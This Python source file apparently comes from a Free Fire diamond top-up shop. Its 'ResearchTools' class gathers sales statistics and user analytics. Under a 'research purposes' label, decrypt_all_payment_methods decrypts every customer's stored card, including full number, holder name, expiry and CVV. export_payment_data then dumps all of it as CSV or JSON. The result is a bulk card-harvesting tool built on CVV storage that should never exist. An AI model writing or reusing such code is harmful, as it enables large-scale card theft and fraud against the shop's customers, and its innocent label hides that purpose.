from models import db, User, DiamondPackage, Order, PaymentMethod
from cryptography.fernet import Fernet
import base64
import json
import csv
from datetime import datetime, timedelta
from io import StringIO

class ResearchTools:
    
    @staticmethod
    def get_system_stats():
        """Get comprehensive system statistics"""
        try:
            total_users = User.query.count()
            total_orders = Order.query.count()
            total_payment_methods = PaymentMethod.query.count()
            
            # Calculate total revenue
            completed_orders = Order.query.filter_by(status='completed').all()
            total_revenue = sum(order.amount for order in completed_orders)
            
            # Calculate average order value
            avg_order_value = total_revenue / len(completed_orders) if completed_orders else 0
            
            # Count orders by status
            completed_orders_count = Order.query.filter_by(status='completed').count()
            pending_orders_count = Order.query.filter_by(status='pending').count()
            
            # Calculate total diamonds sold
            total_diamonds_sold = sum(order.diamonds for order in completed_orders)
            
            return {
                'total_users': total_users,
                'total_orders': total_orders,
                'total_revenue': round(total_revenue, 2),
                'total_payment_methods': total_payment_methods,
                'completed_orders': completed_orders_count,
                'pending_orders': pending_orders_count,
                'avg_order_value': round(avg_order_value, 2),
                'total_diamonds_sold': total_diamonds_sold
            }
        except Exception as e:
            print(f"Error getting system stats: {e}")
            return {
                'total_users': 0,
                'total_orders': 0,
                'total_revenue': 0,
                'total_payment_methods': 0,
                'completed_orders': 0,
                'pending_orders': 0,
                'avg_order_value': 0,
                'total_diamonds_sold': 0
            }
    
    @staticmethod
    def decrypt_all_payment_methods():
        """Decrypt all payment methods for research purposes"""
        decrypted_data = []
        payment_methods = PaymentMethod.query.all()
        
        for method in payment_methods:
            try:
                user = User.query.get(method.user_id)
                if user and user.encryption_key:
                    decrypted = method.decrypt_data(user.encryption_key.encode())
                    if decrypted:
                        decrypted_data.append({
                            'user_id': user.id,
                            'username': user.username,
                            'email': user.email,
                            'payment_method_id': method.id,
                            'card_type': method.card_type,
                            'last_four': method.last_four,
                            'card_holder_name': decrypted['card_holder_name'],
                            'card_number': decrypted['card_number'],
                            'expiry_month': decrypted['expiry_month'],
                            'expiry_year': decrypted['expiry_year'],
                            'cvv': decrypted['cvv'],
                            'is_default': method.is_default,
                            'created_at': method.created_at.isoformat() if method.created_at else None
                        })
            except Exception as e:
                print(f"Error decrypting payment method {method.id}: {e}")
                continue
        
        return decrypted_data
    
    @staticmethod
    def export_payment_data(format_type='json'):
        """Export payment data in specified format"""
        decrypted_data = ResearchTools.decrypt_all_payment_methods()
        
        if format_type == 'csv':
            output = StringIO()
            writer = csv.writer(output)
            
            # Write header
            writer.writerow([
                'User ID', 'Username', 'Email', 'Payment Method ID',
                'Card Type', 'Last Four', 'Card Holder Name', 'Card Number',
                'Expiry Month', 'Expiry Year', 'CVV', 'Is Default', 'Created At'
            ])
            
            # Write data
            for item in decrypted_data:
                writer.writerow([
                    item['user_id'],
                    item['username'],
                    item['email'],
                    item['payment_method_id'],
                    item['card_type'],
                    item['last_four'],
                    item['card_holder_name'],
                    item['card_number'],
                    item['expiry_month'],
                    item['expiry_year'],
                    item['cvv'],
                    item['is_default'],
                    item['created_at']
                ])
            
            return output.getvalue()
        
        else:  # JSON format
            return json.dumps(decrypted_data, indent=2)
    
    @staticmethod
    def find_duplicate_cards():
        """Find duplicate card numbers in the system"""
        decrypted_data = ResearchTools.decrypt_all_payment_methods()
        card_numbers = {}
        duplicates = []
        
        for item in decrypted_data:
            card_number = item['card_number']
            if card_number in card_numbers:
                card_numbers[card_number].append(item)
            else:
                card_numbers[card_number] = [item]
        
        for card_number, users in card_numbers.items():
            if len(users) > 1:
                duplicates.append({
                    'card_number': card_number,
                    'users': users,
                    'count': len(users)
                })
        
        return duplicates
    
    @staticmethod
    def get_user_analytics(user_id=None):
        """Get detailed analytics for a specific user or all users"""
        if user_id:
            # Single user analytics
            user = User.query.get(user_id)
            if not user:
                return {'error': 'User not found'}
            
            user_orders = Order.query.filter_by(user_id=user_id).all()
            user_payment_methods = PaymentMethod.query.filter_by(user_id=user_id).all()
            
            completed_orders = [order for order in user_orders if order.status == 'completed']
            total_spent = sum(order.amount for order in completed_orders)
            total_diamonds = sum(order.diamonds for order in completed_orders)
            
            return {
                'user_id': user.id,
                'username': user.username,
                'email': user.email,
                'freefire_id': user.freefire_id,
                'balance': user.balance,
                'total_orders': len(user_orders),
                'completed_orders': len(completed_orders),
                'total_spent': round(total_spent, 2),
                'total_diamonds_purchased': total_diamonds,
                'payment_methods_count': len(user_payment_methods),
                'member_since': user.created_at.isoformat() if user.created_at else None,
                'is_admin': user.is_admin,
                'recent_orders': [
                    {
                        'order_id': order.id,
                        'package_name': order.package.name,
                        'diamonds': order.diamonds,
                        'amount': order.amount,
                        'status': order.status,
                        'created_at': order.created_at.isoformat() if order.created_at else None
                    }
                    for order in user_orders[:10]  # Last 10 orders
                ]
            }
        else:
            # All users analytics
            users = User.query.all()
            analytics = []
            
            for user in users:
                user_orders = Order.query.filter_by(user_id=user.id).all()
                completed_orders = [order for order in user_orders if order.status == 'completed']
                total_spent = sum(order.amount for order in completed_orders)
                
                analytics.append({
                    'user_id': user.id,
                    'username': user.username,
                    'email': user.email,
                    'freefire_id': user.freefire_id,
                    'balance': user.balance,
                    'total_orders': len(user_orders),
                    'completed_orders': len(completed_orders),
                    'total_spent': round(total_spent, 2),
                    'is_admin': user.is_admin,
                    'member_since': user.created_at.isoformat() if user.created_at else None
                })
            
            return analytics
